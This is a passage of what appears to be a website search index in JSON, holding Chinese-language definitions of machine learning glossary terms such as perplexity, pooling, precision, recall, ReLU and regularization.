derivative)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#166-partitioning-strategy","text":"\u5728 \u53c2\u6570\u670d\u52a1\u5668 \u95f4\u5206\u5272\u53d8\u91cf\u7684\u7b97\u6cd5\u3002","title":"16.6. \u5212\u5206\u7b56\u7565 (partitioning strategy)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#167-performance","text":"\u591a\u542b\u4e49\u672f\u8bed\uff0c\u5177\u6709\u4ee5\u4e0b\u542b\u4e49\uff1a \u5728\u8f6f\u4ef6\u5de5\u7a0b\u4e2d\u7684\u4f20\u7edf\u542b\u4e49\u3002\u5373\uff1a\u76f8\u5e94\u8f6f\u4ef6\u7684\u8fd0\u884c\u901f\u5ea6\u6709\u591a\u5feb\uff08\u6216\u6709\u591a\u9ad8\u6548\uff09\uff1f \u5728\u673a\u5668\u5b66\u4e60\u4e2d\u7684\u542b\u4e49\u3002\u5728\u673a\u5668\u5b66\u4e60\u9886\u57df\uff0c\u6027\u80fd\u65e8\u5728\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898\uff1a\u76f8\u5e94 \u6a21\u578b \u7684\u51c6\u786e\u5ea6\u6709\u591a\u9ad8\uff1f\u5373\u6a21\u578b\u5728\u9884\u6d4b\u65b9\u9762\u7684\u8868\u73b0\u6709\u591a\u597d\uff1f","title":"16.7. \u6027\u80fd (performance)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#168-perplexity","text":"\u4e00\u79cd\u8861\u91cf\u6307\u6807\uff0c\u7528\u4e8e\u8861\u91cf \u6a21\u578b \u80fd\u591f\u591a\u597d\u5730\u5b8c\u6210\u4efb\u52a1\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u4efb\u52a1\u662f\u8bfb\u53d6\u7528\u6237\u4f7f\u7528\u667a\u80fd\u624b\u673a\u952e\u76d8\u8f93\u5165\u5b57\u8bcd\u65f6\u8f93\u5165\u7684\u524d\u51e0\u4e2a\u5b57\u6bcd\uff0c\u7136\u540e\u5217\u51fa\u4e00\u7ec4\u53ef\u80fd\u7684\u5b8c\u6574\u5b57\u8bcd\u3002\u6b64\u4efb\u52a1\u7684\u56f0\u60d1\u5ea6 (P) \u662f\uff1a\u4e3a\u4e86\u4f7f\u5217\u51fa\u7684\u5b57\u8bcd\u4e2d\u5305\u542b\u7528\u6237\u5c1d\u8bd5\u8f93\u5165\u7684\u5b9e\u9645\u5b57\u8bcd\uff0c\u60a8\u9700\u8981\u63d0\u4f9b\u7684\u731c\u6d4b\u9879\u7684\u4e2a\u6570\u3002 \u56f0\u60d1\u5ea6\u4e0e \u4ea4\u53c9\u71b5 \u7684\u5173\u7cfb\u5982\u4e0b\uff1a p = 2^{-\\text{\u4ea4\u53c9\u71b5}}","title":"16.8. \u56f0\u60d1\u5ea6 (perplexity)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#169-pipeline","text":"\u673a\u5668\u5b66\u4e60\u7b97\u6cd5\u7684\u57fa\u7840\u67b6\u6784\u3002\u6d41\u6c34\u7ebf\u5305\u62ec\u6536\u96c6\u6570\u636e\u3001\u5c06\u6570\u636e\u653e\u5165\u8bad\u7ec3\u6570\u636e\u6587\u4ef6\u3001\u8bad\u7ec3\u4e00\u4e2a\u6216\u591a\u4e2a\u6a21\u578b\uff0c\u4ee5\u53ca\u5c06\u6a21\u578b\u5bfc\u51fa\u5230\u751f\u4ea7\u73af\u5883\u3002","title":"16.9. \u6d41\u6c34\u7ebf (pipeline)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1610-pooling","text":"\u5c06\u4e00\u4e2a\u6216\u591a\u4e2a\u7531\u524d\u8d8b\u7684 \u5377\u79ef\u5c42 \u521b\u5efa\u7684\u77e9\u9635\u538b\u7f29\u4e3a\u8f83\u5c0f\u7684\u77e9\u9635\u3002\u6c60\u5316\u901a\u5e38\u662f\u53d6\u6574\u4e2a\u6c60\u5316\u533a\u57df\u7684\u6700\u5927\u503c\u6216\u5e73\u5747\u503c\u3002\u4ee5\u4e0b\u9762\u7684 3x3 \u77e9\u9635\u4e3a\u4f8b\uff1a \u6c60\u5316\u8fd0\u7b97\u4e0e\u5377\u79ef\u8fd0\u7b97\u7c7b\u4f3c\uff1a\u5c06\u77e9\u9635\u5206\u5272\u4e3a\u591a\u4e2a\u5207\u7247\uff0c\u7136\u540e\u6309 \u6b65\u957f \u9010\u4e2a\u8fd0\u884c\u5377\u79ef\u8fd0\u7b97\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u6c60\u5316\u8fd0\u7b97\u6309 1x1 \u6b65\u957f\u5c06\u5377\u79ef\u77e9\u9635\u5206\u5272\u4e3a 2x2 \u4e2a\u5207\u7247\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u8fdb\u884c\u4e86\u56db\u4e2a\u6c60\u5316\u8fd0\u7b97\u3002\u5047\u8bbe\u6bcf\u4e2a\u6c60\u5316\u8fd0\u7b97\u90fd\u9009\u62e9\u8be5\u5207\u7247\u4e2d\u56db\u4e2a\u503c\u7684\u6700\u5927\u503c\uff1a \u6c60\u5316\u6709\u52a9\u4e8e\u5728\u8f93\u5165\u77e9\u9635\u4e2d\u5b9e\u73b0 \u5e73\u79fb\u4e0d\u53d8\u6027 \u3002 \u5bf9\u4e8e\u89c6\u89c9\u5e94\u7528\u6765\u8bf4\uff0c\u6c60\u5316\u7684\u66f4\u6b63\u5f0f\u540d\u79f0\u4e3a\u7a7a\u95f4\u6c60\u5316\u3002\u65f6\u95f4\u5e8f\u5217\u5e94\u7528\u901a\u5e38\u5c06\u6c60\u5316\u79f0\u4e3a\u65f6\u5e8f\u6c60\u5316\u3002\u6309\u7167\u4e0d\u592a\u6b63\u5f0f\u7684\u8bf4\u6cd5\uff0c\u6c60\u5316\u901a\u5e38\u79f0\u4e3a\u4e0b\u91c7\u6837\u6216\u964d\u91c7\u6837\u3002","title":"16.10. \u6c60\u5316 (pooling)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1611-positive-class","text":"\u5728 \u4e8c\u5143\u5206\u7c7b \u4e2d\uff0c\u4e24\u79cd\u53ef\u80fd\u7684\u7c7b\u522b\u5206\u522b\u88ab\u6807\u8bb0\u4e3a\u6b63\u7c7b\u522b\u548c\u8d1f\u7c7b\u522b\u3002\u6b63\u7c7b\u522b\u7ed3\u679c\u662f\u6211\u4eec\u8981\u6d4b\u8bd5\u7684\u5bf9\u8c61\u3002\uff08\u4e0d\u53ef\u5426\u8ba4\u7684\u662f\uff0c\u6211\u4eec\u4f1a\u540c\u65f6\u6d4b\u8bd5\u8fd9\u4e24\u79cd\u7ed3\u679c\uff0c\u4f46\u53ea\u5173\u6ce8\u6b63\u7c7b\u522b\u7ed3\u679c\u3002\uff09\u4f8b\u5982\uff0c\u5728\u533b\u5b66\u68c0\u67e5\u4e2d\uff0c\u6b63\u7c7b\u522b\u53ef\u4ee5\u662f\"\u80bf\u7624\"\u3002\u5728\u7535\u5b50\u90ae\u4ef6\u5206\u7c7b\u5668\u4e2d\uff0c\u6b63\u7c7b\u522b\u53ef\u4ee5\u662f\"\u5783\u573e\u90ae\u4ef6\"\u3002 \u4e0e \u8d1f\u7c7b\u522b \u76f8\u5bf9\u3002","title":"16.11. \u6b63\u7c7b\u522b (positive class)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1612-precision","text":"\u4e00\u79cd \u5206\u7c7b\u6a21\u578b \u6307\u6807\u3002\u7cbe\u786e\u7387\u6307\u6a21\u578b\u6b63\u786e\u9884\u6d4b \u6b63\u7c7b\u522b \u7684\u9891\u7387\uff0c\u5373\uff1a \\text{\u7cbe\u786e\u7387} = \\frac{\u6b63\u4f8b\u6570}{\u6b63\u4f8b\u6570 + \u5047\u6b63\u4f8b\u6570}","title":"16.12. \u7cbe\u786e\u7387 (precision)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1613-prediction","text":"\u6a21\u578b\u5728\u6536\u5230\u8f93\u5165 \u6837\u672c \u540e\u7684\u8f93\u51fa\u3002","title":"16.13. \u9884\u6d4b (prediction)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1614-prediction-bias","text":"\u4e00\u79cd\u503c\uff0c\u7528\u4e8e\u8868\u660e \u9884\u6d4b \u5e73\u5747\u503c\u4e0e\u6570\u636e\u96c6\u4e2d \u6807\u7b7e \u7684\u5e73\u5747\u503c\u76f8\u5dee\u6709\u591a\u5927\u3002","title":"16.14. \u9884\u6d4b\u504f\u5dee (prediction bias)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1615-estimator-pre-made-estimator","text":"\u5176\u4ed6\u4eba\u5df2\u5efa\u597d\u7684 Estimator \u3002TensorFlow \u63d0\u4f9b\u4e86\u4e00\u4e9b\u9884\u521b\u5efa\u7684 Estimator\uff0c\u5305\u62ec DNNClassifier \u3001 DNNRegressor \u548c LinearClassifier \u3002\u60a8\u53ef\u4ee5\u6309\u7167 \u8fd9\u4e9b\u8bf4\u660e \u6784\u5efa\u81ea\u5df1\u9884\u521b\u5efa\u7684 Estimator\u3002","title":"16.15. \u9884\u521b\u5efa\u7684 Estimator (pre-made Estimator)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1616-pre-trained-model","text":"\u5df2\u7ecf\u8fc7\u8bad\u7ec3\u7684\u6a21\u578b\u6216\u6a21\u578b\u7ec4\u4ef6\uff08\u4f8b\u5982 \u5d4c\u5957 \uff09\u3002\u6709\u65f6\uff0c\u60a8\u9700\u8981\u5c06\u9884\u8bad\u7ec3\u7684\u5d4c\u5957\u9988\u9001\u5230 \u795e\u7ecf\u7f51\u7edc \u3002\u5728\u5176\u4ed6\u65f6\u5019\uff0c\u60a8\u7684\u6a21\u578b\u5c06\u81ea\u884c\u8bad\u7ec3\u5d4c\u5957\uff0c\u800c\u4e0d\u4f9d\u8d56\u4e8e\u9884\u8bad\u7ec3\u7684\u5d4c\u5957\u3002","title":"16.16. \u9884\u8bad\u7ec3\u6a21\u578b (pre-trained model)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1617-prior-belief","text":"\u5728\u5f00\u59cb\u91c7\u7528\u76f8\u5e94\u6570\u636e\u8fdb\u884c\u8bad\u7ec3\u4e4b\u524d\uff0c\u60a8\u5bf9\u8fd9\u4e9b\u6570\u636e\u62b1\u6709\u7684\u4fe1\u5ff5\u3002\u4f8b\u5982\uff0c L_2 \u6b63\u5219\u5316 \u4f9d\u8d56\u7684\u5148\u9a8c\u4fe1\u5ff5\u662f \u6743\u91cd \u5e94\u8be5\u5f88\u5c0f\u4e14\u5e94\u4ee5 0 \u4e3a\u4e2d\u5fc3\u5448\u6b63\u6001\u5206\u5e03\u3002","title":"16.17. \u5148\u9a8c\u4fe1\u5ff5 (prior belief)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#17-q","text":"","title":"17. Q"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#171-queue","text":"\u4e00\u79cd TensorFlow \u64cd\u4f5c \uff0c\u7528\u4e8e\u5b9e\u73b0\u961f\u5217\u6570\u636e\u7ed3\u6784\u3002\u901a\u5e38\u7528\u4e8e I/O \u4e2d\u3002","title":"17.1. \u961f\u5217 (queue)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#18-r","text":"","title":"18. R"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#181-rank","text":"\u673a\u5668\u5b66\u4e60\u4e2d\u7684\u4e00\u4e2a\u591a\u542b\u4e49\u672f\u8bed\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e0b\u5217\u542b\u4e49\u4e4b\u4e00\uff1a \u5f20\u91cf \u4e2d\u7684\u7ef4\u6570\u3002\u4f8b\u5982\uff0c\u6807\u91cf\u7b49\u7ea7\u4e3a 0\uff0c\u5411\u91cf\u7b49\u7ea7\u4e3a 1\uff0c\u77e9\u9635\u7b49\u7ea7\u4e3a 2\u3002 \u5728\u5c06\u7c7b\u522b\u4ece\u6700\u9ad8\u5230\u6700\u4f4e\u8fdb\u884c\u6392\u5e8f\u7684\u673a\u5668\u5b66\u4e60\u95ee\u9898\u4e2d\uff0c\u7c7b\u522b\u7684\u987a\u5e8f\u4f4d\u7f6e\u3002\u4f8b\u5982\uff0c\u884c\u4e3a\u6392\u5e8f\u7cfb\u7edf\u53ef\u4ee5\u5c06\u72d7\u72d7\u7684\u5956\u52b1\u4ece\u6700\u9ad8\uff08\u725b\u6392\uff09\u5230\u6700\u4f4e\uff08\u67af\u840e\u7684\u7fbd\u8863\u7518\u84dd\uff09\u8fdb\u884c\u6392\u5e8f\u3002","title":"18.1. \u7b49\u7ea7 (rank)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#182-rater","text":"\u4e3a \u6837\u672c \u63d0\u4f9b \u6807\u7b7e \u7684\u4eba\u3002\u6709\u65f6\u79f0\u4e3a\"\u6ce8\u91ca\u8005\"\u3002","title":"18.2. \u8bc4\u5206\u8005 (rater)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#183-recall","text":"\u4e00\u79cd \u5206\u7c7b\u6a21\u578b \u6307\u6807\uff0c\u7528\u4e8e\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898\uff1a\u5728\u6240\u6709\u53ef\u80fd\u7684\u6b63\u7c7b\u522b\u6807\u7b7e\u4e2d\uff0c\u6a21\u578b\u6b63\u786e\u5730\u8bc6\u522b\u51fa\u4e86\u591a\u5c11\u4e2a\uff1f\u5373\uff1a \\text{\u53ec\u56de\u7387} = \\frac{\u6b63\u4f8b\u6570}{\u6b63\u4f8b\u6570 + \u5047\u8d1f\u4f8b\u6570}","title":"18.3. \u53ec\u56de\u7387 (recall)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#184-relu-rectified-linear-unit","text":"\u4e00\u79cd \u6fc0\u6d3b\u51fd\u6570 \uff0c\u5176\u89c4\u5219\u5982\u4e0b\uff1a \u5982\u679c\u8f93\u5165\u4e3a\u8d1f\u6570\u6216 0\uff0c\u5219\u8f93\u51fa 0\u3002 \u5982\u679c\u8f93\u5165\u4e3a\u6b63\u6570\uff0c\u5219\u8f93\u51fa\u7b49\u4e8e\u8f93\u5165\u3002","title":"18.4. \u4fee\u6b63\u7ebf\u6027\u5355\u5143 (ReLU, Rectified Linear Unit)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#185-regression-model","text":"\u4e00\u79cd\u6a21\u578b\uff0c\u80fd\u591f\u8f93\u51fa\u8fde\u7eed\u7684\u503c\uff08\u901a\u5e38\u4e3a\u6d6e\u70b9\u503c\uff09\u3002\u8bf7\u4e0e \u5206\u7c7b\u6a21\u578b \u8fdb\u884c\u6bd4\u8f83\uff0c\u5206\u7c7b\u6a21\u578b\u4f1a\u8f93\u51fa\u79bb\u6563\u503c\uff0c\u4f8b\u5982\"\u9ec4\u82b1\u83dc\"\u6216\"\u864e\u76ae\u767e\u5408\"\u3002","title":"18.5. \u56de\u5f52\u6a21\u578b (regression model)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#186-regularization","text":"\u5bf9\u6a21\u578b\u590d\u6742\u5ea6\u7684\u60e9\u7f5a\u3002\u6b63\u5219\u5316\u6709\u52a9\u4e8e\u9632\u6b62\u51fa\u73b0 \u8fc7\u62df\u5408 \uff0c\u5305\u542b\u4ee5\u4e0b\u7c7b\u578b\uff1a L_1 \u6b63\u5219\u5316 L_2 \u6b63\u5219\u5316 \u4e22\u5f03\u6b63\u5219\u5316 \u65e9\u505c\u6cd5 \uff08\u8fd9\u4e0d\u662f\u6b63\u5f0f\u7684\u6b63\u5219\u5316\u65b9\u6cd5\uff0c\u4f46\u53ef\u4ee5\u6709\u6548\u9650\u5236\u8fc7\u62df\u5408\uff09","title":"18.6. \u6b63\u5219\u5316 (regularization)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#187-regularization-rate","text":"\u4e00\u79cd\u6807\u91cf\u503c\uff0c\u4ee5 lambda \u8868\u793a\uff0c\u7528\u4e8e\u6307\u5b9a\u6b63\u5219\u5316\u51fd\u6570\u7684\u76f8\u5bf9\u91cd\u8981\u6027\u3002\u4ece\u4e0b\u9762\u7b80\u5316\u7684 \u635f\u5931 \u516c\u5f0f\u4e2d\u53ef\u4ee5\u770b\u51fa\u6b63\u5219\u5316\u7387\u7684\u5f71\u54cd\uff1a \\min(\\text{\u635f\u5931\u65b9\u7a0b} + \\lambda \\text{\u6b63\u5219\u5316\u65b9\u7a0b}) \u63d0\u9ad8\u6b63\u5219\u5316\u7387\u53ef\u4ee5\u51cf\u5c11 \u8fc7\u62df\u5408 \uff0c\u4f46\u53ef\u80fd\u4f1a\u4f7f\u6a21\u578b\u7684 \u51c6\u786e\u7387 \u964d\u4f4e\u3002","title":"18.7. \u6b63\u5219\u5316\u7387 (regularization rate)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#188-representation","text":"\u5c06\u6570\u636e\u6620\u5c04\u5230\u5b9e\u7528 \u7279\u5f81 \u7684\u8fc7\u7a0b\u3002","title":"18.8. \u8868\u793a\u6cd5 (representation)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#189-receiver-operating-characteristic-roc","text":"\u4e0d\u540c \u5206\u7c7b\u9608\u503c \u4e0b\u7684 \u6b63\u4f8b\u7387 \u548c \u5047\u6b63\u4f8b\u7387 \u6784\u6210\u7684\u66f2\u7ebf\u3002\u53e6\u8bf7\u53c2\u9605 \u66f2\u7ebf\u4e0b\u9762\u79ef \u3002","title":"18.9. \u53d7\u8bd5\u8005\u5de5\u4f5c\u7279\u5f81\u66f2\u7ebf\uff08receiver operating characteristic\uff0c\u7b80\u79f0 ROC \u66f2\u7ebf\uff09"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1810-root-directory","text":"\u60a8\u6307\u5b9a\u7684\u76ee\u5f55\uff0c\u7528\u4e8e\u6258\u7ba1\u591a\u4e2a\u6a21\u578b\u7684 TensorFlow \u68c0\u67e5\u70b9\u548c\u4e8b\u4ef6\u6587\u4ef6\u7684\u5b50\u76ee\u5f55\u3002","title":"18.10. \u6839\u76ee\u5f55 (root directory)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1811-rmse-root-mean-squared-error","text":"\u5747\u65b9\u8bef\u5dee \u7684\u5e73\u65b9\u6839\u3002","title":"18.11. \u5747\u65b9\u6839\u8bef\u5dee (RMSE, Root Mean Squared Error)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1812-rotational-invariance","text":"\u5728\u56fe\u50cf\u5206\u7c7b\u95ee\u9898\u4e2d\uff0c\u5373\u4f7f\u56fe\u50cf\u7684\u65b9\u5411\u53d1\u751f\u53d8\u5316\uff0c\u7b97\u6cd5\u4e5f\u80fd\u6210\u529f\u5730\u5bf9\u56fe\u50cf\u8fdb\u884c\u5206\u7c7b\u3002\u4f8b\u5982\uff0c\u65e0\u8bba\u7f51\u7403\u62cd\u671d\u4e0a\u3001\u4fa7\u5411\u8fd8\u662f\u671d\u4e0b\u653e\u7f6e\uff0c\u8be5\u7b97\u6cd5\u4ecd\u7136\u53ef\u4ee5\u8bc6\u522b\u5b83\u3002\u8bf7\u6ce8\u610f\uff0c\u5e76\u975e\u603b\u662f\u5e0c\u671b\u65cb\u8f6c\u4e0d\u53d8\uff1b\u4f8b\u5982\uff0c\u5012\u7f6e\u7684\"9\"\u4e0d\u5e94\u5206\u7c7b\u4e3a\"9\"\u3002 \u53e6\u8bf7\u53c2\u9605 \u5e73\u79fb\u4e0d\u53d8\u6027 \u548c \u5927\u5c0f\u4e0d\u53d8\u6027 \u3002","title":"18.12. \u65cb\u8f6c\u4e0d\u53d8\u6027 (rotational invariance)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#19-s","text":"","title":"19. S"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#191-savedmodel","text":"\u4fdd\u5b58\u548c\u6062\u590d TensorFlow \u6a21\u578b\u65f6\u5efa\u8bae\u4f7f\u7528\u7684\u683c\u5f0f\u3002SavedModel \u662f\u4e00\u79cd\u72ec\u7acb\u4e8e\u8bed\u8a00\u4e14\u53ef\u6062\u590d\u7684\u5e8f\u5217\u5316\u683c\u5f0f\uff0c\u4f7f\u8f83\u9ad8\u7ea7\u522b\u7684\u7cfb\u7edf\u548c\u5de5\u5177\u53ef\u4ee5\u521b\u5efa\u3001\u4f7f\u7528\u548c\u8f6c\u6362 TensorFlow \u6a21\u578b\u3002 \u5982\u9700\u5b8c\u6574\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u300aTensorFlow \u7f16\u7a0b\u4eba\u5458\u6307\u5357\u300b\u4e2d\u7684 \u4fdd\u5b58\u548c\u6062\u590d \u3002","title":"19.1. SavedModel"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#192-saver","text":"\u4e00\u79cd TensorFlow \u5bf9\u8c61 \uff0c\u8d1f\u8d23\u4fdd\u5b58\u6a21\u578b\u68c0\u67e5\u70b9\u3002","title":"19.2. 